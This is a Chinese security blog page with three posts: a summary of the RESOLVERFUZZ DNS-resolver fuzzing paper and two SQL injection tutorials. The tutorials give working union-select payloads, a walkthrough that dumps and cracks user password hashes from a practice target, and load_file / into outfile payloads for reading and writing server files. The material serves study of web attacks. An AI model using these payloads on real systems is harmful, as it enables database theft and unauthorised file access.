<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>qinyiwen</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="qinyiwen">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="qinyiwen">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="qinyiwen" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qinyiwen</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-Paper-Code Vulnerability Detection via Signal-Aware AI" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/" class="article-date">
  <time class="dt-published" datetime="2024-02-03T09:05:55.000Z" itemprop="datePublished">2024-02-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/">RESOLVERFUZZ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="RESOLVERFUZZ-Automated-Discovery-of-DNS-Resolver-Vulnerabilities-with-Query-Response-Fuzzing-论文分享"><a href="#RESOLVERFUZZ-Automated-Discovery-of-DNS-Resolver-Vulnerabilities-with-Query-Response-Fuzzing-论文分享" class="headerlink" title="RESOLVERFUZZ: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing 论文分享"></a>RESOLVERFUZZ: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing 论文分享</h3><p>Zhang, Q., Bai, X., Li, X., Duan, H., Li, Q., &amp; Li, Z. (2023). ResolverFuzz: Automated Discovery of DNS Resolver Vulnerabilities with Query-Response Fuzzing. ArXiv, abs&#x2F;2310.03202.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;sec23winter-prepub-246-zhang-qifan.pdf</a></p>
<p>RESOLVERFUZZ：使用查询-响应模糊测试自动发现DNS解析器漏洞</p>
<p>RESOLVERFUZZ通过专注于简短的查询响应序列来执行受限状态模糊处理，这是目前查找解析器错误的最有效的方法。其次，为了生成更有可能触发解析器错误的测试用例，本文将基于概率上下文自由语法（PCFG）的输入生成与查询和响应的字节级突变相结合。最后，利用差分测试和集群来识别缓存中毒等非崩溃漏洞。</p>
<h4 id="现存的解析器漏洞检测方法局限"><a href="#现存的解析器漏洞检测方法局限" class="headerlink" title="现存的解析器漏洞检测方法局限"></a>现存的解析器漏洞检测方法局限</h4><ol>
<li>大多数已知的解析器漏洞都是非崩溃漏洞，现有的检测手段无法直接检测到</li>
<li>缺乏严格的规范，无法将测试用例归类为解析器错误</li>
<li>解析器是有状态的，由于输入空间大，有状态模糊仍然具有挑战性</li>
</ol>
<h4 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h4><p>如何使分析仪器能够更准确地进行流量分类，在不同的流量中捕捉隐式的和鲁棒的模式。</p>
<h4 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h4><ol>
<li>对DNS CVE进行了全面研究。</li>
<li>根据CVE研究的见解，开发了一个新的黑盒模糊系统RESOLVER-FUZZ。它执行受限的查询响应模糊，以在解析器上发现有效的错误。</li>
<li>为RESOLVERFUZZ开发和&#x2F;或调整一套技术，包括DNS本地化、基于PCFG的测试生成、差异测试等。</li>
<li>针对6个主流解析器对RESOLVERFUZZ进行了评估，发现了23个漏洞。</li>
</ol>
<h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>DNS（Domain Name System）是一个分布式数据库系统，它将域名与IP地址进行映射，以便用户可以通过易记的域名访问互联网上的各种资源。DNS系统由多个组件组成，包括域名服务器、解析器和DNS协议等。</p>
<p>域名服务器存储了大量的域名与IP地址的映射关系，当用户输入一个域名时，解析器会向域名服务器发送请求，以获取对应的IP地址。域名服务器可以分为多个级别，包括根域名服务器、顶级域名服务器和权威域名服务器，它们协同工作，帮助解析器找到正确的IP地址。</p>
<h4 id="DNS解析器"><a href="#DNS解析器" class="headerlink" title="DNS解析器"></a>DNS解析器</h4><p>解析器是用户设备或网络设备上的软件，它负责将用户输入的域名转换为对应的IP地址。解析器首先会查询本地缓存，如果没有找到对应的IP地址，就会向域名服务器发送请求，获取正确的IP地址。解析器还可以进行递归查询，即向多个域名服务器发送请求，直到找到正确的IP地址为止。</p>
<h4 id="DNS查询和响应的格式"><a href="#DNS查询和响应的格式" class="headerlink" title="DNS查询和响应的格式"></a>DNS查询和响应的格式</h4><p>遵循RFC 1034，RFC 1034定义了DNS查询和响应的格式，这些格式是DNS系统中用于进行域名解析的标准。以下是DNS查询和响应的格式遵循RFC 1034的主要内容：</p>
<p>DNS查询格式：</p>
<ul>
<li>查询报文格式遵循RFC 1034中定义的标准格式，包括查询标识、查询类型、查询类别等字段。</li>
<li>查询报文通常包括一个或多个查询问题部分，每个问题部分包含一个域名、查询类型和查询类别。</li>
</ul>
<p>DNS响应格式：</p>
<ul>
<li>响应报文格式同样遵循RFC 1034中定义的标准格式，包括响应标识、响应类型、响应类别等字段。</li>
<li>响应报文通常包括一个或多个资源记录部分，每个资源记录包含了对查询的响应信息，包括域名、TTL（生存时间）、数据长度和实际数据等字段。</li>
</ul>
<p>在RFC 1034中，还定义了DNS报文的各个字段的具体含义和格式要求，以及报文的传输方式和处理规则。这些规范使得不同的DNS实现能够遵循统一的标准，确保了DNS系统的互操作性和稳定性。</p>
<p>下图是一个DNS消息的示例</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cd3dbcec-a849-45bb-8dd9-badd507bbf1c" alt="image"></p>
<h4 id="DNS相关漏洞的分布和根本原因"><a href="#DNS相关漏洞的分布和根本原因" class="headerlink" title="DNS相关漏洞的分布和根本原因"></a>DNS相关漏洞的分布和根本原因</h4><p>下表是本文对主流DNS软件的DNS CVE研究结果</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/da44b6ca-4c51-422b-bbdb-29a7492f25b1" alt="image"></p>
<ul>
<li>F1：大多数CVE都是关于解析器的。本文总共确定了与6个研究的DNS软件相关的291个CVE（132个CVE与其他DNS软件有关）。其中，245（84%）是关于解析器（例如，递归和转发器模式的CVE-2019-6477和CVE-2020-8621）。只有46个CVE是关于名称服务器的（例如，CVE-2020-8619和CVE-2017-3143）。</li>
<li>F2：DNS软件中的多样化CVE。虽然BIND在CVE1的数量上占主导地位，但在其他软件（Technitium除外）中也发现了大量CVE。此外，本文发现245个CVE中只有13个CVE影响所有软件（例如，CVE-2020-12662下的NXNSAt-tack），这表明DNS软件的实现多种多样。</li>
<li>F3：很大一部分cve与崩溃无关。与先前研究TCP堆栈中的CVE的结果一样，本文发现不会触发软件崩溃的漏洞占很大一部分(245个cve中有109个)。主要后果包括缓存中毒(46个CVE，例如，在CVE-2002-2213和CVE-2006-0527下缓存非法记录)和资源消耗(39个CVE，例如，在CVE-2022-2795和CVE-2021-25219下花费过多的资源来处理DNS查询)。在136个与崩溃相关的bug中，只有43个是由CVE-2020-8625和CVE-2021-25216下的缓冲区溢出等内存损坏引起的。其他主要由断言失败触发(例如，CVE-2022-0635和CVE-2022-3080)。</li>
<li>F4：DNS消息的几乎每个字段都有相关的CVE。示例包括查询名称（CVE-2020- 8617）、查询类型（CVE-2022-0667）、查询标志（CVE-2017-15105）、rcode（CVE-2018-5734）、rdata（CVE-2013-4854）、TTL（CVE-2003-0914）等。</li>
<li>F5：大多数CVE都是通过非常短的消息序列触发的。本文发现222&#x2F;245（91%）的CVE可以通过仅发送一个客户端查询或ns-响应来触发。其中一个例子是CVE-2022-3736。对于其他需要更长序列的CVE（例如，CVE- 2022-3924），需要许多客户端查询来触发错误。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/03/Paper-Code%20Vulnerability%20Detection%20via%20Signal-Aware%20AI/" data-id="cls5up31u00004ovf13qfhrdy" data-title="RESOLVERFUZZ" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-SQLi1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/01/Web-SQLi1/" class="article-date">
  <time class="dt-published" datetime="2024-02-01T10:15:18.000Z" itemprop="datePublished">2024-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/01/Web-SQLi1/">SQLi1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h4><p>参考 <a target="_blank" rel="noopener" href="https://www.yuque.com/weiker/xiaodi/ail8hbspn7hllqzi">https://www.yuque.com/weiker/xiaodi/ail8hbspn7hllqzi</a></p>
<h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>产生原因，可控变量带入数据库查询，变量未存在过滤或过滤不严谨，过滤不严谨的可以绕过过滤</p>
<p>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p>
<p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p>
<h5 id="SQL注入的产生过程及常见原因"><a href="#SQL注入的产生过程及常见原因" class="headerlink" title="SQL注入的产生过程及常见原因"></a>SQL注入的产生过程及常见原因</h5><p><strong>产生过程</strong></p>
<p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</p>
<p><strong>常见原因</strong></p>
<p>基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。 </p>
<h6 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h6><p>Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p>
<h6 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h6><p>数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p>
<p>这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p>
<h6 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h6><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</p>
<h6 id="不当的错误处理"><a href="#不当的错误处理" class="headerlink" title="不当的错误处理"></a>不当的错误处理</h6><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p>
<h6 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h6><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。</p>
<p>应用打开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p>
<p> 例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。</p>
<h2 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h2><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a9944c5-8c6e-4cce-a49c-9415ce187723" alt="image"></p>
<p>知识点：</p>
<p>1、数据库版本在5.0以上就是高版本，需要用information_schema有据查询</p>
<p>在Mysql5.0以上版本中，MySQL存在一个自带数据库名为information_schema，它是一个存储记录所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息</p>
<p>2、数据库中符号”.”代表下一级，dbqyw.user表示dbqyw数据库下的user表名</p>
<p>information_schema.schemata：记录所有数据库名信息的表</p>
<p>information_schema.tables：记录所有表名信息的表</p>
<p>information_schema.columns：记录所有列名信息的表</p>
<p>schema_name：数据库名</p>
<p>table_name：表名</p>
<p>column_name：列名</p>
<p>table_schema：数据库名</p>
<p>3、猜解多个数据可以采用 limit x,1 变动猜解</p>
<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、判断注入点</span><br><span class="line">老办法：</span><br><span class="line">and 1=1 页面正常</span><br><span class="line">and 1=2 页面错误</span><br><span class="line">可能存在注入点，但是这个老方法现在用的少了，用最新的</span><br><span class="line"></span><br><span class="line">2、猜测列名数量（字段数）</span><br><span class="line">order by x x回显正常，x+1回显错误，有x个字段</span><br><span class="line"></span><br><span class="line">3、猜解</span><br><span class="line">最前面的1改成-1</span><br><span class="line">-1 union select 1,2,...,x</span><br><span class="line">显示几，几就是注入点</span><br><span class="line"></span><br><span class="line">4、信息收集</span><br><span class="line">数据库版本：version()</span><br><span class="line">数据库名：database()</span><br><span class="line">数据库用户：user()</span><br><span class="line">操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>

<h5 id="版本探测的意义"><a href="#版本探测的意义" class="headerlink" title="版本探测的意义"></a>版本探测的意义</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库</span><br><span class="line">相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名。</span><br></pre></td></tr></table></figure>

<h5 id="Mysql数据库结构"><a href="#Mysql数据库结构" class="headerlink" title="Mysql数据库结构"></a>Mysql数据库结构</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据库A = 网站A</span><br><span class="line">    表名</span><br><span class="line">        列名</span><br><span class="line">            数据</span><br><span class="line">。。。。。。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要层层递进得到数据</p>
<h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">注入点为2，查询数据库mozhe_Discuz_StormGroup的表名</span><br><span class="line">-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;</span><br><span class="line">表名为StormGroup_member，只显示了一个表名，如果要显示所有，就加上group_concat</span><br><span class="line">-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;</span><br><span class="line">显示了所有表名StormGroup_member,notice</span><br><span class="line"></span><br><span class="line">查询表StormGroup_member的列名 </span><br><span class="line">-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;StormGroup_member&#x27;</span><br><span class="line">列名为id,name,password,status</span><br><span class="line"></span><br><span class="line">查询指定数据</span><br><span class="line">-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</span><br><span class="line">name为mozhe和mozhe</span><br><span class="line">password为356f589a7df439f6f744ff19bb8092c0和aa47b6f4aebaad8799e735b0e31dfc1c</span><br><span class="line">对于这道题，题目提示了password经过的md5加密，解密后password为dsan13和807150，第一个被禁用了，第二个可以正常登录得到key</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/01/Web-SQLi1/" data-id="cls21u8kr0000rsvf2nzfdj7k" data-title="SQLi1" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Web-SQLi2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/01/Web-SQLi2/" class="article-date">
  <time class="dt-published" datetime="2024-02-01T09:26:10.000Z" itemprop="datePublished">2024-02-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/01/Web-SQLi2/">SQLi2</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="SQL注入-MySQL注入"><a href="#SQL注入-MySQL注入" class="headerlink" title="SQL注入 MySQL注入"></a>SQL注入 MySQL注入</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image">  </p>
<h5 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h5><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
<p>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
<ul>
<li><strong>SCHEMATA表</strong></li>
</ul>
<p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p>
<p>获取到数据库名称</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| information_schema | utf8                       |</span><br><span class="line">| challenges         | gbk                        |</span><br><span class="line">| mysql              | latin1                     |</span><br><span class="line">| performance_schema | utf8                       |</span><br><span class="line">| security           | gbk                        |</span><br><span class="line">+--------------------+----------------------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>TABLES 表</li>
</ul>
<p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables <span class="built_in">limit</span> 0,5;</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS                        |</span><br><span class="line">| def           | information_schema | COLLATIONS                            |</span><br><span class="line">| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| def           | information_schema | COLUMNS                               |</span><br><span class="line">| def           | information_schema | COLUMN_PRIVILEGES                     |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<ul>
<li>COLUMNS 表</li>
</ul>
<p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>USER_PRIVILEGES 表</li>
</ul>
<p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USER_PRIVILEGES <span class="built_in">limit</span> 0,5;</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | SELECT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | INSERT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | UPDATE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | DELETE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | CREATE         | YES          |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<h5 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">load_file()：读取函数</span><br><span class="line">into outfile或into dumpfile：导出函数</span><br><span class="line">路径获取常见方法：</span><br><span class="line">报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line">-1 union select 1,load_file(&#x27;文件路径&#x27;),3</span><br><span class="line">写入文件</span><br><span class="line">-1 union select 1,&#x27;x&#x27;,3 into outfile &#x27;文件路径&#x27;--+</span><br><span class="line">文件路径符号用/，如果是\，要写成\\</span><br><span class="line"></span><br><span class="line">常见文件读取列表：</span><br><span class="line"></span><br><span class="line">常见文件写入问题：魔术引号开关</span><br><span class="line">magic_quotes_gpc</span><br><span class="line"></span><br><span class="line">魔术引号及常见防护</span><br><span class="line"></span><br><span class="line">低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br><span class="line"></span><br><span class="line">SQL语句干扰符号：&#x27; &quot; % ) &#125; 等，具体看写法</span><br></pre></td></tr></table></figure>

<p>参考地址：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
<p>load_file						文件读取</p>
<p>into outfile 或into dumpfile		文件写入</p>
<p>查询是否有写入的权限</p>
